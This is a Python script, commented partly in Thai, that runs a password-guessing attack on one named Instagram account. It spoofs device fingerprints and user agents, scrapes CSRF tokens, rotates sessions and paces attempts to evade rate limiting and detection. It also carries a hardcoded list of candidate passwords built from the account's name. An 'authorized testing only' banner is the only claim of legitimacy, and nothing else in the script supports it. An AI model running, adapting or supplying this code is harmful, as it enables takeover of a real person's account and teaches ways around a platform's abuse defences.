#!/usr/bin/env python3
"""
🔥 ADVANCED PENETRATION ATTACK 🔥
================================

Advanced Instagram penetration testing script
สำหรับ alx.trading ด้วย stealth techniques และ evasion methods

⚠️ FOR EDUCATIONAL/AUTHORIZED TESTING ONLY ⚠️
"""

import asyncio
import aiohttp
import random
import time
import json
import base64
import hashlib
import hmac
from fake_useragent import UserAgent


class AdvancedPenetrationEngine:
    """Advanced Instagram Penetration Engine"""
    
    def __init__(self, target_username: str):
        self.target = target_username
        self.ua = UserAgent()
        self.session_pool = []
        self.proxy_pool = []
        self.csrf_tokens = {}
        self.cookies_pool = []
        self.success_indicators = []
        
        # Advanced evasion settings
        self.min_delay = 45  # Minimum 45 seconds
        self.max_delay = 120  # Maximum 2 minutes
        self.max_attempts_per_session = 3
        self.session_rotation_interval = 5
        
        print("🔥 ADVANCED PENETRATION ENGINE INITIALIZED")
        print(f"🎯 Target: {self.target}")
        print("🛡️ Stealth Mode: ACTIVE")
        print("🔄 Session Rotation: ENABLED")
        print("🎭 User-Agent Spoofing: ACTIVE")
    
    def generate_device_fingerprint(self):
        """สร้าง device fingerprint ที่เหมือนจริง"""
        devices = [
            {
                "model": "iPhone14,2",
                "ios": "16.6.1",
                "app_version": "302.0.0.23.108",
                "resolution": "1170x2532"
            },
            {
                "model": "SM-G998B",
                "android": "13",
                "app_version": "302.0.0.27.111",
                "resolution": "1440x3200"
            },
            {
                "model": "Pixel 7",
                "android": "14",
                "app_version": "302.0.0.27.111",
                "resolution": "1080x2400"
            }
        ]
        
        device = random.choice(devices)
        
        # สร้าง unique device ID
        device_id = hashlib.md5(
            f"{device['model']}{time.time()}".encode()
        ).hexdigest()[:16]
        
        return device, device_id
    
    def create_advanced_headers(self, csrf_token=None):
        """สร้าง headers ที่ bypass detection"""
        device, device_id = self.generate_device_fingerprint()
        
        # Mobile app headers (harder to detect)
        if random.choice([True, False]):
            ua_string = (f"Instagram {device['app_version']} "
                        f"(iPhone; iOS {device['ios']}; Scale/3.00)")
            headers = {
                "User-Agent": ua_string,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "X-IG-App-ID": "936619743392459",
                "X-IG-Device-ID": device_id,
                "X-IG-Android-ID": f"android-{device_id}",
                "X-Request-ID": self.generate_request_id(),
                "X-IG-Connection-Type": "WIFI",
                "X-IG-Capabilities": "3brTv10=",
            }
        else:
            # Browser headers
            accept_header = ("text/html,application/xhtml+xml,"
                           "application/xml;q=0.9,image/webp,*/*;q=0.8")
            headers = {
                "User-Agent": self.ua.random,
                "Accept": accept_header,
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
            }
        
        if csrf_token:
            headers["X-CSRFToken"] = csrf_token
            headers["X-Instagram-AJAX"] = "1"
            headers["X-Requested-With"] = "XMLHttpRequest"
        
        return headers
    
    def generate_request_id(self):
        """สร้าง request ID ที่เหมือนจริง"""
        return str(int(time.time() * 1000000))[:13]
    
    async def create_stealth_session(self):
        """สร้าง session ที่ bypass detection"""
        connector = aiohttp.TCPConnector(
            limit=10,
            limit_per_host=5,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            ssl=False  # Bypass SSL verification for speed
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=self.create_advanced_headers()
        )
        
        return session
    
    async def advanced_csrf_extraction(self, session):
        """Advanced CSRF token extraction ด้วยหลายวิธี"""
        methods = [
            self.extract_csrf_from_login_page,
            self.extract_csrf_from_api,
            self.extract_csrf_from_graphql,
            self.extract_csrf_from_shared_data
        ]
        
        for method in methods:
            try:
                csrf_token = await method(session)
                if csrf_token:
                    print(f"✅ CSRF extracted via {method.__name__}")
                    return csrf_token
            except Exception as e:
                print(f"⚠️ {method.__name__} failed: {e}")
                continue
        
        return None
    
    async def extract_csrf_from_login_page(self, session):
        """ดึง CSRF จากหน้า login"""
        async with session.get("https://www.instagram.com/accounts/login/") as response:
            if response.status == 200:
                content = await response.text()
                
                # Method 1: จาก meta tag
                import re
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', content)
                if csrf_match:
                    return csrf_match.group(1)
                
                # Method 2: จาก window._sharedData
                shared_match = re.search(r'window\._sharedData = ({.+?});', content)
                if shared_match:
                    try:
                        shared_data = json.loads(shared_match.group(1))
                        return shared_data.get('config', {}).get('csrf_token')
                    except:
                        pass
        
        return None
    
    async def extract_csrf_from_api(self, session):
        """ดึง CSRF จาก API endpoint"""
        async with session.get("https://www.instagram.com/api/v1/web/data/shared_data/") as response:
            if response.status == 200:
                data = await response.json()
                return data.get('config', {}).get('csrf_token')
        return None
    
    async def extract_csrf_from_graphql(self, session):
        """ดึง CSRF จาก GraphQL endpoint"""
        payload = {
            "query": "query { viewer { id } }"
        }
        
        async with session.post(
            "https://www.instagram.com/graphql/query/",
            json=payload
        ) as response:
            # CSRF token อาจอยู่ใน response headers
            return response.headers.get('X-CSRFToken')
    
    async def extract_csrf_from_shared_data(self, session):
        """ดึง CSRF จาก shared data endpoint"""
        async with session.get("https://www.instagram.com/") as response:
            if response.status == 200:
                content = await response.text()
                import re
                match = re.search(r'"csrf_token":"([^"]+)"', content)
                return match.group(1) if match else None
        return None
    
    def create_advanced_login_payload(self, username, password, csrf_token):
        """สร้าง login payload ที่ bypass detection"""
        timestamp = int(time.time())
        
        # Method 1: Standard web login
        if random.choice([True, False]):
            return {
                "username": username,
                "password": password,
                "queryParams": "{}",
                "optIntoOneTap": "false",
                "trustedDeviceRecords": "{}",
                "stopDeletionNonce": "",
                "loginSource": "Login",
            }
        
        # Method 2: Mobile app style
        else:
            device, device_id = self.generate_device_fingerprint()
            
            # Generate signature (Instagram mobile app style)
            signed_body = json.dumps({
                "username": username,
                "password": password,
                "device_id": device_id,
                "login_attempt_count": 0,
            })
            
            signature = hmac.new(
                b"4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fbb2e151be6",
                signed_body.encode(),
                hashlib.sha256
            ).hexdigest()
            
            return {
                "signed_body": f"{signature}.{base64.b64encode(signed_body.encode()).decode()}",
                "ig_sig_key_version": "4"
            }
    
    async def advanced_login_attempt(self, session, username, password, csrf_token):
        """Advanced login attempt ด้วย evasion techniques"""
        
        # Update headers with CSRF
        session.headers.update(self.create_advanced_headers(csrf_token))
        
        # Create payload
        payload = self.create_advanced_login_payload(username, password, csrf_token)
        
        # Choose endpoint based on payload type
        if "signed_body" in payload:
            url = "https://i.instagram.com/api/v1/accounts/login/"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        else:
            url = "https://www.instagram.com/accounts/login/ajax/"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        # Add referer for legitimacy
        headers["Referer"] = "https://www.instagram.com/accounts/login/"
        
        try:
            async with session.post(
                url,
                data=payload,
                headers=headers
            ) as response:
                
                response_text = await response.text()
                
                # Analyze response
                result = {
                    "status_code": response.status,
                    "response": response_text,
                    "headers": dict(response.headers),
                    "success": False,
                    "checkpoint": False,
                    "rate_limited": False,
                    "account_exists": False
                }
                
                if response.status == 200:
                    try:
                        data = json.loads(response_text)
                        
                        if data.get("authenticated"):
                            result["success"] = True
                            print(f"🎉 SUCCESS! Login successful for {username}")
                        
                        elif "checkpoint" in response_text.lower():
                            result["checkpoint"] = True
                            result["account_exists"] = True
                            print(f"🔒 CHECKPOINT triggered for {username}")
                        
                        elif "incorrect" in response_text.lower():
                            result["account_exists"] = True
                            print(f"❌ Wrong password for {username}")
                        
                    except json.JSONDecodeError:
                        if "login" in response_text.lower():
                            result["account_exists"] = True
                
                elif response.status == 429:
                    result["rate_limited"] = True
                    print(f"🚨 Rate limited")
                
                return result
                
        except Exception as e:
            print(f"❌ Login attempt failed: {e}")
            return {
                "status_code": 0,
                "success": False,
                "error": str(e)
            }
    
    async def intelligent_delay(self, attempt_num, last_response):
        """Intelligent delay based on response"""
        base_delay = self.min_delay
        
        # Increase delay based on attempt number
        if attempt_num > 10:
            base_delay += 30
        if attempt_num > 25:
            base_delay += 60
        
        # Increase delay if rate limited
        if last_response and last_response.get("rate_limited"):
            base_delay += 180  # Add 3 minutes
        
        # Random variance
        variance = random.uniform(0.8, 1.2)
        final_delay = min(base_delay * variance, self.max_delay)
        
        print(f"⏰ Intelligent delay: {final_delay:.1f}s (attempt #{attempt_num})")
        await asyncio.sleep(final_delay)
    
    async def run_advanced_attack(self, password_list):
        """เรียกใช้ advanced attack"""
        print("\n🔥 STARTING ADVANCED PENETRATION ATTACK")
        print("=" * 60)
        
        results = []
        session_count = 0
        
        for attempt_num, password in enumerate(password_list, 1):
            
            # Create new session every N attempts
            if attempt_num % self.session_rotation_interval == 1:
                if session_count > 0:
                    await session.close()
                
                session = await self.create_stealth_session()
                session_count += 1
                print(f"🔄 New stealth session #{session_count}")
                
                # Get fresh CSRF token
                csrf_token = await self.advanced_csrf_extraction(session)
                if not csrf_token:
                    print("❌ Failed to get CSRF token")
                    continue
                
                print(f"🔑 Fresh CSRF: {csrf_token[:10]}...")
            
            print(f"\n🎯 Attempt #{attempt_num}: {password}")
            
            # Perform login attempt
            result = await self.advanced_login_attempt(
                session, self.target, password, csrf_token
            )
            
            results.append({
                "attempt": attempt_num,
                "password": password,
                "result": result
            })
            
            # Check for success
            if result.get("success"):
                print(f"🎉 PENETRATION SUCCESSFUL!")
                print(f"🔑 Password: {password}")
                await session.close()
                return password, results
            
            # Check for checkpoint (high value)
            if result.get("checkpoint"):
                print(f"🔒 CHECKPOINT - High probability password!")
                self.success_indicators.append(password)
            
            # Intelligent delay
            await self.intelligent_delay(attempt_num, result)
            
            # Stop if too many rate limits
            rate_limited_count = sum(
                1 for r in results[-10:] 
                if r["result"].get("rate_limited")
            )
            
            if rate_limited_count >= 5:
                print("🚨 Too many rate limits - pausing attack")
                break
        
        if session_count > 0:
            await session.close()
        
        return None, results


def load_priority_passwords():
    """โหลดรหัสผ่าน priority"""
    try:
        with open('/workspaces/sugarglitch-realops/priority_passwords.txt', 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords[:20]  # ใช้แค่ 20 ตัวแรก
    except:
        # Fallback passwords
        return [
            "4l3x.7r4dlng2025",
            "4l3x7r4dlng2025", 
            "Alex.Trading2025",
            "alex.trading2025",
            "AlxTrading2025",
            "4L3X.7R4DLNG2025",
            "4l3x_7r4dlng2025",
            "4l3x-7r4dlng2025",
            "4l3x.7r4dlng2024",
            "4l3x.7r4dlng!",
        ]


async def main():
    """Main advanced penetration function"""
    
    print("🔥 ADVANCED INSTAGRAM PENETRATION TOOL 🔥")
    print("=" * 60)
    print("⚠️  FOR AUTHORIZED TESTING ONLY")
    print("🎯 Target: alx.trading")
    print("🛡️ Advanced Evasion: ENABLED")
    print("=" * 60)
    
    # ยืนยันการใช้งาน
    confirm = input("\n⚠️ Start advanced penetration attack? (y/N): ")
    if confirm.lower() != 'y':
        print("❌ Attack cancelled")
        return
    
    # โหลดรหัสผ่าน
    passwords = load_priority_passwords()
    print(f"🔑 Loaded {len(passwords)} priority passwords")
    
    # เริ่มการโจมตี
    engine = AdvancedPenetrationEngine("alx.trading")
    
    success_password, results = await engine.run_advanced_attack(passwords)
    
    # สรุปผล
    print("\n" + "=" * 60)
    print("📊 ADVANCED PENETRATION RESULTS")
    print("=" * 60)
    
    if success_password:
        print(f"🎉 PENETRATION SUCCESSFUL!")
        print(f"🔑 Password: {success_password}")
        print(f"🎯 Target: alx.trading")
    else:
        print("💔 No successful penetration")
        
        # แสดง high-value indicators
        if engine.success_indicators:
            print(f"\n🔒 HIGH-VALUE PASSWORDS (triggered checkpoint):")
            for pwd in engine.success_indicators:
                print(f"   🎯 {pwd}")
    
    # สถิติ
    total_attempts = len(results)
    rate_limited = sum(1 for r in results if r["result"].get("rate_limited"))
    checkpoints = sum(1 for r in results if r["result"].get("checkpoint"))
    
    print(f"\n📈 STATISTICS:")
    print(f"   🔢 Total attempts: {total_attempts}")
    print(f"   🚨 Rate limited: {rate_limited}")
    print(f"   🔒 Checkpoints: {checkpoints}")
    print(f"   📊 Success rate: {(1 if success_password else 0)/max(total_attempts,1)*100:.1f}%")
    
    print(f"\n💀 Advanced penetration attack completed")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⚠️ Attack interrupted by user")
    except Exception as e:
        print(f"\n💥 Attack error: {e}")
